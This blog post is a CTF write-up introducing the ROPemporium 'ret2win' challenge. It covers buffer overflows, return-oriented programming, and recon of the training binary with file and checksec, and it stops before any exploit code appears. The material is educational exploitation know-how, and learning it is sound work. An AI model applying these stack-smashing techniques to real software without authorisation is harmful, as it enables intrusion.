posts/2021-03-22-ropemporium-ret2win.org
#+title: ROPemporium | ret2win
#+date: <2021-03-22 11:55>
#+filetags: ROPemporium overflow write-up exploitation

* Introduction
Welcome to this little write-up on the very first challenge from ROPemporium.

ROPemporium is a platform for learning the mystic art of return-oriented programming(ROP).
This is accomplished by going through 8 challenges in total, with increasing diffyculty.

But before we begin this little eight-part adventure, let's take a closer look at what ROP is for a thing.

** Buffer overflows
I know that I just said i would explain ROP, but before we get into that.
Let us quickly brushup on what a buffer overflow is.

According to the very first paragraph on [[https://en.wikipedia.org/wiki/Buffer_overflow][wikipedia]]:
#+begin_quote
In information security and programming, a buffer overflow, or buffer overrun, is an anomaly where a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations.
#+end_quote

So buffer overflows happens when it is possible to put more data into a variable thereby overwriting other memory adresses.

But why is this dangerous??

Because we can manipulate the content in the different registers.
And through this execute abitriary code.

Again this was a veeeery short overview, if you want to read more about buffer overflows, and I recommend that you do, here is a list of resources on the subject:
- [[https://blog.rapid7.com/2019/02/19/stack-based-buffer-overflow-attacks-what-you-need-to-know/][Rapid7 - Stack-Based]] :: Explained with Examples
- [[https://0xrick.github.io/][0xrick]] :: Look at his basic binary series
- [[https://github.com/Tzaoh/pwning][Tzaoh's pwning list]] :: Huge list of resources on all kinds of exploitation
- [[https://pwn.college/][pwn.college]] :: A free and opensource exploitation course

Eventually I'll create a series focused just on buffer overflows, but for now you'll have to make do.

** Return Oriented Programming
Again we look towards Wikipedia for more knowledge.
The first paragraph on [[https://en.wikipedia.org/wiki/Return-oriented_programming][Wikipedia]]:
#+begin_quote
Return-oriented programming (ROP) is a computer security exploit technique that allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing.
#+end_quote

The basic principle for ROP is that we can control which function we return to when we land on a ~ret~ instruction.
There is also the topic of gadgets, but I'll explain that in the ~split~ write-up.

But how does one control which the software will return to?

That is exactly what this challenge is about.

* Recon
Before anything is done you should always to some reconnaissance on your target.
The more you know about the target, the easier it will be to model an attack towards it.
** File
The first thing you should do with any compiled binary that you want to pwn(professionel language for defeating security), is to run the ~file~ command on the the binary.
#+begin_example
┌────[~/ha/bi/ropemporium/ret2win on  master [?]
└─>file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
#+end_example
What this tells us is that the binary ~ret2win~ is a 64-bit ELF file.

It is not stripped, which means that if there is any debugging information in the code, we should be able to see it.
It also means symbols are left in so we can see function names.

** Checksec
After looking at what ~file~ gives outputs, the next nifty tool we should use is: ~checksec~.
It is a part of ~pwntools~, [[https://github.com/Gallopsled/pwntools][a CTF framework and exploit development library]], and can tell us about what kind of security measures that the binary is compiled with.
#+begin_example
┌────[~/ha/bi/ropemporium/ret2win on  master [?]
└─>checksec ret2win
[*] '/home/c3lphie/hacking/binary_exploitation/ropemporium/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
#+end_example
Here we see that there is basically no security measures put in place... Which one would expect on the very first challenge.
But what is it that we see here?

- Arch :: This is the Architecture for which the binary was compiled for. In this case we see that it is ~amd64-64-little~ I'll break this down further in a minute.
- RELRO :: A security measure which makes some binary sections read-only. Partial RELRO means basically nothing for us. Full RELRO is a lot more secure, but I'll tackle this when I encounter it.
- Stack :: This tells us if there are any canaries compiled into the binary. Canaries are a security measure that protect from stack smashing attacks... Like what we're doing here. Not that they can't be handled
- NX :: A technology which splits the areas of memory up so that data can't be executed. This is the security measure we bypass using ROP
- PIE :: If this was enabled, the binary would have been loaded randomly into memory making it harder to exploit. But this is not something we need to worry about.

The architecture this binary was compiled for was ~amd64-64-little~, let's split this up into two.
~amd64-64~ means that it's for a 64 bit system.
~-little~ tells us that is for a little endian system.
Which you can read more about [[https://www.section.io/engineering-education/what-is-little-endian-and-big-endian/][here]].

** Reversing the binary
Now there are probably a ton of other tools that you could use to find other things about the binary.
But at this point I know enough about the target for now.

I have chosen [[https://binary.ninja/][Binary ninja]] for reverse engineering software.
But use what-ever you're most comfortable in, and if you don't have the economy to buy a piece of software, then there are opensource software available like [[https://cutter.re/][cutter]] or [[https://ghidra-sre.org/][ghidra]](if you're not afraid of the NSA ;)).
